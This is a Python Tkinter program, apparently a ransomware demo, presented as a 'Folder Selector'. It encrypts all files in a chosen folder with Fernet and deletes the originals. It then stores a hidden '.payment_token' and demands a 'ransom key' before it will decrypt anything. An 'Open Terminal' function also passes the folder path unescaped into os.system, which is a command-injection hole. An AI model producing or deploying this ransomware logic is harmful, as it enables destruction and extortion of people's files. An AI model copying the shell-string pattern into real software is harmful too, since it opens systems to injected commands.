import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
import os
from cryptography.fernet import Fernet
import random
import string

# Initialize the main window
root = tk.Tk()
root.title("Folder Selector")
root.geometry("600x400")
root.config(bg="#4a00e0")

# Function to load or generate an encryption key
def load_key():
    key_file = "encryption_key.key"
    if os.path.exists(key_file):
        with open(key_file, "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open(key_file, "wb") as key_file:
            key_file.write(key)
        return key

# Function to save the token in a hidden file
def save_token(token, folder_path):
    token_file_path = os.path.join(folder_path, ".payment_token")
    with open(token_file_path, "w") as token_file:
        token_file.write(token)

# Function to load the token from the hidden file
def load_token(folder_path):
    token_file_path = os.path.join(folder_path, ".payment_token")
    if os.path.exists(token_file_path):
        with open(token_file_path, "r") as token_file:
            return token_file.read()
    else:
        return None

# Function to generate a random token
def generate_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Function to encrypt the folder
def encrypt_folder():
    folder_path = folder_label.cget("text")
    if folder_path and os.path.isdir(folder_path):
        key = load_key()
        fernet = Fernet(key)
        token = generate_token()  # Generate a token
        save_token(token, folder_path)  # Save the token in a hidden file

        for root_dir, _, files in os.walk(folder_path):
            for file_name in files:
                file_path = os.path.join(root_dir, file_name)
                # Skip the token file and encrypted files
                if file_name != ".payment_token" and not file_name.endswith(".enc"):
                    with open(file_path, "rb") as file:
                        file_data = file.read()

                    encrypted_data = fernet.encrypt(file_data)

                    encrypted_file_path = file_path + ".enc"
                    with open(encrypted_file_path, "wb") as encrypted_file:
                        encrypted_file.write(encrypted_data)

                    os.remove(file_path)  # Remove the original file after encryption

        messagebox.showinfo("Encryption", f"All files in {folder_path} have been encrypted.")
    else:
        messagebox.showwarning("Warning", "No valid folder selected for encryption.")

# Function to decrypt the folder
def decrypt_folder():
    folder_path = folder_label.cget("text")
    if folder_path and os.path.isdir(folder_path):
        token = load_token(folder_path)  # Load the token from the hidden file
        if not token:
            messagebox.showwarning("Warning", "No token found. Files cannot be decrypted.")
            return

        ransom_key = simpledialog.askstring("Ransom Key", "Enter the ransom key to decrypt files:")
        if ransom_key != token:  # Compare entered key with the token
            messagebox.showwarning("Warning", "Incorrect ransom key. Files cannot be decrypted.")
            return

        key = load_key()
        fernet = Fernet(key)

        for root_dir, _, files in os.walk(folder_path):
            for file_name in files:
                file_path = os.path.join(root_dir, file_name)
                # Skip the token file and only decrypt encrypted files
                if file_name != ".payment_token" and file_name.endswith(".enc"):
                    with open(file_path, "rb") as encrypted_file:
                        encrypted_data = encrypted_file.read()

                    decrypted_data = fernet.decrypt(encrypted_data)

                    original_file_path = file_path[:-4]  # Remove .enc extension
                    with open(original_file_path, "wb") as decrypted_file:
                        decrypted_file.write(decrypted_data)

                    os.remove(file_path)  # Remove the encrypted file after decryption

        messagebox.showinfo("Decryption", f"All files in {folder_path} have been decrypted.")
    else:
        messagebox.showwarning("Warning", "No valid folder selected for decryption.")

# Function to open a terminal at the chosen folder
def open_terminal():
    folder_path = folder_label.cget("text")
    if folder_path and os.path.isdir(folder_path):
        try:
            # Try to open GNOME Terminal in the specified folder
            os.system(f'gnome-terminal --working-directory="{folder_path}"')
        except Exception:
            messagebox.showerror("Error", "Failed to open the terminal. Ensure GNOME Terminal is installed.")
    else:
        messagebox.showwarning("Warning", "No valid folder selected.")

# Function to select the folder
def select_folder():
    folder_path = filedialog.askdirectory()
    if folder_path:
        folder_label.config(text=folder_path)
        encrypt_button.pack(pady=(20, 10))
        decrypt_button.pack(pady=(0, 10))
        terminal_button.pack(pady=(0, 10))
    else:
        folder_label.config(text="No folder selected.")
        encrypt_button.pack_forget()
        decrypt_button.pack_forget()
        terminal_button.pack_forget()

# Set up the GUI components
title_label = tk.Label(root, text="Select a Folder", font=("Helvetica", 24), bg="#4a00e0", fg="white")
title_label.pack(pady=(60, 20))

choose_button = tk.Button(root, text="Choose Folder", command=select_folder, font=("Helvetica", 14), bg="#ff7f50", fg="white", activebackground="#e67300", cursor="hand2")
choose_button.pack(pady=(0, 20))

folder_label = tk.Label(root, text="No folder selected.", font=("Helvetica", 12), bg="#4a00e0", fg="#d3d3d3")
folder_label.pack(pady=(0, 10))

encrypt_button = tk.Button(root, text="Encrypt Folder", command=encrypt_folder, font=("Helvetica", 14), bg="#ff7f50", fg="white", activebackground="#e67300", cursor="hand2")

decrypt_button = tk.Button(root, text="Decrypt Folder", command=decrypt_folder, font=("Helvetica", 14), bg="#ff7f50", fg="white", activebackground="#e67300", cursor="hand2")

terminal_button = tk.Button(root, text="Open Terminal", command=open_terminal, font=("Helvetica", 14), bg="#ff7f50", fg="white", activebackground="#e67300", cursor="hand2")

root.mainloop()

